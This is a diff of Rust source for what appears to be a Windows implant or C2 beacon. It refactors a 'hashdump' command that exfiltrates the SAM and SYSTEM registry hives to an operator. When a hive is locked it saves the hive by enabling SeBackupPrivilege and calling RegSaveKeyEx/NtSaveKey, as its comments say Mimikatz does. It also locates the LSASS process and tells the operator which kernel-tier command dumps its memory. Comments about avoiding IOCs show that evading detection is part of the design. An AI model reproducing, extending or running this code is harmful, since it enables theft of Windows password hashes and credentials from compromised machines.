@@ -52,8 +52,21 @@ unsafe fn stream_file(rt: &Runtime, host_path: &str, chunk_name: &str) -> Vec<Re
     // Probe: non-sync open, GENERIC_READ, FILE_SHARE_READ only. If the hive is
     // locked (live system) or we lack access (non-SYSTEM), this returns a
     // failing status immediately — no hang.
-    const STATUS_SHARING_VIOLATION: i32 = 0xC000_0043_u32 as i32;
-    const STATUS_ACCESS_DENIED: i32 = 0xC000_0022_u32 as i32;
+    if let Some(chunks) = unsafe { stream_file_probe(rt, host_path, chunk_name) } {
+        return chunks;
+    }
+    // Real read path (the probe confirmed it's safe to open synchronously).
+    stream_file_read(rt, host_path, chunk_name)
+}
+
+/// Open the hive non-synchronously and classify the outcome. Returns
+/// `Some(chunks)` when the probe failed (the response(s) to surface), `None`
+/// when the file is readable and the caller should stream it.
+unsafe fn stream_file_probe(
+    rt: &Runtime,
+    host_path: &str,
+    chunk_name: &str,
+) -> Option<Vec<Response>> {
     let probe = unsafe {
         crate::fs::open_file_nosync(
             rt,
@@ -73,63 +86,78 @@ unsafe fn stream_file(rt: &Runtime, host_path: &str, chunk_name: &str) -> Vec<Re
             let _ = crate::syscalls::nt_close(rt, handle as usize);
         }
         Err(crate::fs::OpenError::Status(s)) => {
-            // Expected on a live SYSTEM implant: hive locked by SAM oplock.
-            // The raw file open can NEVER win against the live oplock — but the
-            // Configuration Manager can save the hive from its in-memory copy
-            // via RegSaveKeyEx/NtSaveKey, which is NOT gated by the file
-            // oplock (that's exactly how Mimikatz/Impacket do it). Try that
-            // fallback before giving up: enable SeBackupPrivilege, open the
-            // registry key, save to a temp file, then stream the temp file.
-            if s == STATUS_SHARING_VIOLATION || s == STATUS_ACCESS_DENIED {
-                match unsafe { save_hive_fallback(chunk_name) } {
-                    Ok(saved) => {
-                        // Saved the hive to a temp file — stream THAT (no oplock).
-                        let mut chunks = crate::fs::do_download(rt, &saved);
-                        let new_name = String::from(chunk_name);
-                        for c in chunks.iter_mut() {
-                            if let Response::FileChunk { name, .. } = c {
-                                *name = new_name.clone();
-                            }
-                        }
-                        unsafe { delete_temp(&saved) };
-                        return chunks;
-                    }
-                    Err(rc) => {
-                        // Surface the save-hive error code for diagnosis.
-                        let mut e = String::from("hashdump: ");
-                        e.push_str(chunk_name);
-                        e.push_str(": hive locked (save-hive failed rc=");
-                        crate::fmt::push_decimal_u32(&mut e, rc as u32);
-                        e.push(')');
-                        return vec![Response::Err(e)];
-                    }
-                }
-            }
-            let why = if s == STATUS_SHARING_VIOLATION {
-                "hive locked by SAM service (save-hive fallback failed: need SeBackupPrivilege)"
-            } else if s == STATUS_ACCESS_DENIED {
-                "access denied (need SYSTEM)"
-            } else {
-                "open failed"
-            };
-            let mut e = String::from("hashdump: ");
-            e.push_str(chunk_name);
-            e.push_str(": ");
-            e.push_str(why);
-            return vec![Response::Err(e)];
+            return Some(stream_file_handle_status(rt, chunk_name, s));
         }
         Err(crate::fs::OpenError::Unresolved) => {
-            return vec![Response::Err(String::from(
+            return Some(vec![Response::Err(String::from(
                 "hashdump: syscall runtime unresolved",
-            ))];
+            ))]);
         }
         Err(crate::fs::OpenError::BadPath) => {
-            return vec![Response::Err(String::from("hashdump: bad path"))];
+            return Some(vec![Response::Err(String::from("hashdump: bad path"))]);
         }
     }
     let _ = note_prefix;
+    None
+}
 
-    // Real read path (the probe confirmed it's safe to open synchronously).
+/// Handle a failing open status: for lock/denied statuses try the save-hive
+/// fallback first; otherwise build the honest "why" error response.
+unsafe fn stream_file_handle_status(rt: &Runtime, chunk_name: &str, s: i32) -> Vec<Response> {
+    const STATUS_SHARING_VIOLATION: i32 = 0xC000_0043_u32 as i32;
+    const STATUS_ACCESS_DENIED: i32 = 0xC000_0022_u32 as i32;
+    if s == STATUS_SHARING_VIOLATION || s == STATUS_ACCESS_DENIED {
+        return stream_file_locked_fallback(rt, chunk_name);
+    }
+    let why = if s == STATUS_SHARING_VIOLATION {
+        "hive locked by SAM service (save-hive fallback failed: need SeBackupPrivilege)"
+    } else if s == STATUS_ACCESS_DENIED {
+        "access denied (need SYSTEM)"
+    } else {
+        "open failed"
+    };
+    let mut e = String::from("hashdump: ");
+    e.push_str(chunk_name);
+    e.push_str(": ");
+    e.push_str(why);
+    vec![Response::Err(e)]
+}
+
+/// Expected on a live SYSTEM implant: hive locked by SAM oplock. The raw file
+/// open can NEVER win against the live oplock — but the Configuration Manager
+/// can save the hive from its in-memory copy via RegSaveKeyEx/NtSaveKey, which
+/// is NOT gated by the file oplock (that's exactly how Mimikatz/Impacket do
+/// it). Try that fallback before giving up: enable SeBackupPrivilege, open the
+/// registry key, save to a temp file, then stream the temp file.
+unsafe fn stream_file_locked_fallback(rt: &Runtime, chunk_name: &str) -> Vec<Response> {
+    match unsafe { save_hive_fallback(chunk_name) } {
+        Ok(saved) => {
+            // Saved the hive to a temp file — stream THAT (no oplock).
+            let mut chunks = crate::fs::do_download(rt, &saved);
+            let new_name = String::from(chunk_name);
+            for c in chunks.iter_mut() {
+                if let Response::FileChunk { name, .. } = c {
+                    *name = new_name.clone();
+                }
+            }
+            unsafe { delete_temp(&saved) };
+            chunks
+        }
+        Err(rc) => {
+            // Surface the save-hive error code for diagnosis.
+            let mut e = String::from("hashdump: ");
+            e.push_str(chunk_name);
+            e.push_str(": hive locked (save-hive failed rc=");
+            crate::fmt::push_decimal_u32(&mut e, rc as u32);
+            e.push(')');
+            vec![Response::Err(e)]
+        }
+    }
+}
+
+/// Stream `host_path` via `do_download`, tagging every `FileChunk` with
+/// `chunk_name` (the hive name the operator sees).
+unsafe fn stream_file_read(rt: &Runtime, host_path: &str, chunk_name: &str) -> Vec<Response> {
     let mut chunks = crate::fs::do_download(rt, host_path);
     let new_name = String::from(chunk_name);
     for c in chunks.iter_mut() {
@@ -150,6 +178,34 @@ pub fn do_hashdump(rt: Option<&'static Runtime>, method: u8) -> Response {
         Some(r) => r,
         None => return Response::Err(String::from("hashdump: syscall runtime down")),
     };
+    let out = unsafe { do_hashdump_collect(rt, method) };
+    // A Vec of multiple responses — but execute() expects one Response. The
+    // beacon loop's execute() returns Vec<Response>, but the Hashdump arm in
+    // beacon.rs currently wraps a single Response in vec![]. To return multiple,
+    // beacon.rs must call do_hashdump_vec instead. We expose both: this single-
+    // Response variant concatenates into one Output (loses the FileChunk
+    // streaming benefit) for callers that want one Response; the beacon uses the
+    // _vec variant below.
+    //
+    // Collapse to a single Output for this signature's contract: join all chunk
+    // data + any Output bytes into one buffer. (Streaming is preserved by the
+    // _vec variant; this one is for parity with other single-Response commands.)
+    let mut joined: Vec<u8> = Vec::new();
+    for r in out {
+        match r {
+            Response::FileChunk { data, .. } | Response::Output(data) => {
+                joined.extend_from_slice(&data);
+            }
+            Response::Err(s) => return Response::Err(s),
+            _ => {}
+        }
+    }
+    Response::Output(joined)
+}
+
+/// Resolve %SystemRoot% and stream the requested hive(s) into a Vec of
+/// responses. Method 2/3/unknown return the deferred/unsupported Err responses.
+unsafe fn do_hashdump_collect(rt: &'static Runtime, method: u8) -> Vec<Response> {
     // Resolve %SystemRoot% so we don't hardcode C:\Windows.
     let sysroot = system_root();
     let mut out: Vec<Response> = Vec::new();
@@ -175,46 +231,23 @@ pub fn do_hashdump(rt: Option<&'static Runtime>, method: u8) -> Response {
         2 => {
             // LSASS memory dump: deferred (loudest credential IOC). Honest Err
             // rather than silence — operator gets a clear "not implemented".
-            return Response::Err(String::from(
+            return vec![Response::Err(String::from(
                 "hashdump lsass: deferred (loudest IOC). Use method=0 SAM + method=1 SYSTEM, decrypt offline.",
-            ));
+            ))];
         }
         3 => {
             // macOS shadow hash — Windows beacon doesn't support it.
-            return Response::Err(String::from(
+            return vec![Response::Err(String::from(
                 "hashdump shadow: macOS-only (use the dev agent). On Windows use method=0 sam / method=1 system.",
-            ));
+            ))];
         }
         other => {
-            return Response::Err({
-                let mut e = String::from("hashdump: unknown method ");
-                crate::fmt::push_decimal_u32(&mut e, other as u32);
-                e
-            });
+            let mut e = String::from("hashdump: unknown method ");
+            crate::fmt::push_decimal_u32(&mut e, other as u32);
+            return vec![Response::Err(e)];
         }
     }
-    // A Vec of multiple responses — but execute() expects one Response. The
-    // beacon loop's execute() returns Vec<Response>, but the Hashdump arm in
-    // beacon.rs currently wraps a single Response in vec![]. To return multiple,
-    // beacon.rs must call do_hashdump_vec instead. We expose both: this single-
-    // Response variant concatenates into one Output (loses the FileChunk
-    // streaming benefit) for callers that want one Response; the beacon uses the
-    // _vec variant below.
-    //
-    // Collapse to a single Output for this signature's contract: join all chunk
-    // data + any Output bytes into one buffer. (Streaming is preserved by the
-    // _vec variant; this one is for parity with other single-Response commands.)
-    let mut joined: Vec<u8> = Vec::new();
-    for r in out {
-        match r {
-            Response::FileChunk { data, .. } | Response::Output(data) => {
-                joined.extend_from_slice(&data);
-            }
-            Response::Err(s) => return Response::Err(s),
-            _ => {}
-        }
-    }
-    Response::Output(joined)
+    out
 }
 
 /// Multi-response variant: returns the streamed FileChunks directly (preserving
@@ -228,6 +261,12 @@ pub fn do_hashdump_vec(rt: Option<&'static Runtime>, method: u8) -> Vec<Response
             ))]
         }
     };
+    unsafe { do_hashdump_vec_collect(rt, method) }
+}
+
+/// Stream the requested hive(s) directly as `FileChunk`s (preserving chunked
+/// framing); method 2 returns the LSASS action signal, unknown methods an Err.
+unsafe fn do_hashdump_vec_collect(rt: &'static Runtime, method: u8) -> Vec<Response> {
     let sysroot = system_root();
     match method {
         0 => {
@@ -246,45 +285,49 @@ pub fn do_hashdump_vec(rt: Option<&'static Runtime>, method: u8) -> Vec<Response
             let sys = format_path(&sysroot, r"\System32\config\SYSTEM");
             unsafe { stream_file(rt, &sys, "SYSTEM") }
         }
-        2 => {
-            // LSASS memory dump via the kernel-tier reader. The implant CANNOT
-            // dump LSASS itself (no_std PIC, no BYOVD, and dumping LSASS from
-            // userland is the loudest possible IOC). The credential material
-            // is captured by the operator-side `nyx-kernel dump-lsass <pid>`
-            // (or `nyx-kernel --serve <port>` daemon) which uses the kernel
-            // DTB+page-walk reader and wraps the bytes in a minidump envelope
-            // (crates/minidump-assembler). Here we return an actionable signal:
-            // the LSASS PID (resolved via the process snapshot) + the exact
-            // command the operator should run on the target.
-            let lsass_pid = find_lsass_pid(rt).unwrap_or(0);
-            let msg = if lsass_pid == 0 {
-                String::from(
-                    "hashdump lsass: dump via the kernel-tier reader (implant cannot dump \
-                     LSASS — loudest IOC). Could not resolve LSASS PID; run `/ps` to find \
-                     lsass.exe, then on the target: `nyx-kernel dump-lsass <pid>` (or start \
-                     `nyx-kernel --serve <port>` daemon and the team server will fetch).\n",
-                )
-            } else {
-                let mut m = String::from(
-                    "hashdump lsass: dump via the kernel-tier reader (implant cannot dump \
-                     LSASS — loudest IOC). LSASS pid=",
-                );
-                crate::fmt::push_decimal_u32(&mut m, lsass_pid as u32);
-                m.push_str(". On the target run: `nyx-kernel dump-lsass ");
-                crate::fmt::push_decimal_u32(&mut m, lsass_pid as u32);
-                m.push_str(
-                    "` — it produces a real .dmp (mimikatz-parseable via minidump-assembler).\n",
-                );
-                m
-            };
-            vec![Response::Output(msg.into_bytes())]
-        }
+        2 => unsafe { do_hashdump_vec_lsass(rt) },
         other => {
             let mut e = String::from("hashdump: unknown method ");
             crate::fmt::push_decimal_u32(&mut e, other as u32);
             vec![Response::Err(e)]
         }
     }
+}
+
+/// Build the method-2 response: the resolved LSASS PID plus the exact command
+/// the operator should run on the target (`nyx-kernel dump-lsass <pid>`).
+unsafe fn do_hashdump_vec_lsass(rt: &'static Runtime) -> Vec<Response> {
+    // LSASS memory dump via the kernel-tier reader. The implant CANNOT
+    // dump LSASS itself (no_std PIC, no BYOVD, and dumping LSASS from
+    // userland is the loudest possible IOC). The credential material
+    // is captured by the operator-side `nyx-kernel dump-lsass <pid>`
+    // (or `nyx-kernel --serve <port>` daemon) which uses the kernel
+    // DTB+page-walk reader and wraps the bytes in a minidump envelope
+    // (crates/minidump-assembler). Here we return an actionable signal:
+    // the LSASS PID (resolved via the process snapshot) + the exact
+    // command the operator should run on the target.
+    let lsass_pid = find_lsass_pid(rt).unwrap_or(0);
+    let msg = if lsass_pid == 0 {
+        String::from(
+            "hashdump lsass: dump via the kernel-tier reader (implant cannot dump \
+             LSASS — loudest IOC). Could not resolve LSASS PID; run `/ps` to find \
+             lsass.exe, then on the target: `nyx-kernel dump-lsass <pid>` (or start \
+             `nyx-kernel --serve <port>` daemon and the team server will fetch).\n",
+        )
+    } else {
+        let mut m = String::from(
+            "hashdump lsass: dump via the kernel-tier reader (implant cannot dump \
+             LSASS — loudest IOC). LSASS pid=",
+        );
+        crate::fmt::push_decimal_u32(&mut m, lsass_pid as u32);
+        m.push_str(". On the target run: `nyx-kernel dump-lsass ");
+        crate::fmt::push_decimal_u32(&mut m, lsass_pid as u32);
+        m.push_str(
+            "` — it produces a real .dmp (mimikatz-parseable via minidump-assembler).\n",
+        );
+        m
+    };
+    vec![Response::Output(msg.into_bytes())]
 }
 
 
@@ -302,9 +345,6 @@ fn find_lsass_pid(_rt: &'static Runtime) -> Option<usize> {
         unsafe extern "system" fn(*mut core::ffi::c_void, *mut ProcessEntry32W) -> i32;
     type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
 
-    const TH32CS_SNAPPROCESS: u32 = 0x00000002;
-    const INVALID_HANDLE_VALUE: *mut core::ffi::c_void = -1isize as *mut core::ffi::c_void;
-
     let snap_addr =
         unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CreateToolhelp32Snapshot") }?;
     let first_addr = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"Process32FirstW") }?;
@@ -316,6 +356,19 @@ fn find_lsass_pid(_rt: &'static Runtime) -> Option<usize> {
     let next: Process32NextW = unsafe { core::mem::transmute(next_addr) };
     let close: CloseHandle = unsafe { core::mem::transmute(close_addr) };
 
+    find_lsass_pid_scan(snap, first, next, close)
+}
+
+/// Take the process snapshot, walk it for `lsass.exe`, then close the handle.
+fn find_lsass_pid_scan(
+    snap: unsafe extern "system" fn(u32, u32) -> *mut core::ffi::c_void,
+    first: unsafe extern "system" fn(*mut core::ffi::c_void, *mut ProcessEntry32W) -> i32,
+    next: unsafe extern "system" fn(*mut core::ffi::c_void, *mut ProcessEntry32W) -> i32,
+    close: unsafe extern "system" fn(*mut core::ffi::c_void) -> i32,
+) -> Option<usize> {
+    const TH32CS_SNAPPROCESS: u32 = 0x00000002;
+    const INVALID_HANDLE_VALUE: *mut core::ffi::c_void = -1isize as *mut core::ffi::c_void;
+
     // SAFETY: CreateToolhelp32Snapshot with TH32CS_SNAPPROCESS returns a snapshot
     // handle valid for the current process list.
     let snap_h = unsafe { snap(TH32CS_SNAPPROCESS, 0) };
@@ -323,6 +376,19 @@ fn find_lsass_pid(_rt: &'static Runtime) -> Option<usize> {
         return None;
     }
 
+    let found = find_lsass_pid_walk(snap_h, first, next);
+    // SAFETY: close the snapshot handle.
+    unsafe { close(snap_h) };
+    found
+}
+
+/// Iterate `Process32FirstW`/`Process32NextW` over the snapshot, matching
+/// `entry.exe` against "lsass.exe" case-insensitively.
+fn find_lsass_pid_walk(
+    snap_h: *mut core::ffi::c_void,
+    first: unsafe extern "system" fn(*mut core::ffi::c_void, *mut ProcessEntry32W) -> i32,
+    next: unsafe extern "system" fn(*mut core::ffi::c_void, *mut ProcessEntry32W) -> i32,
+) -> Option<usize> {
     let mut entry = ProcessEntry32W {
         size: core::mem::size_of::<ProcessEntry32W>() as u32,
         cnt_usage: 0,
@@ -353,8 +419,6 @@ fn find_lsass_pid(_rt: &'static Runtime) -> Option<usize> {
             }
         }
     }
-    // SAFETY: close the snapshot handle.
-    unsafe { close(snap_h) };
     found
 }
 
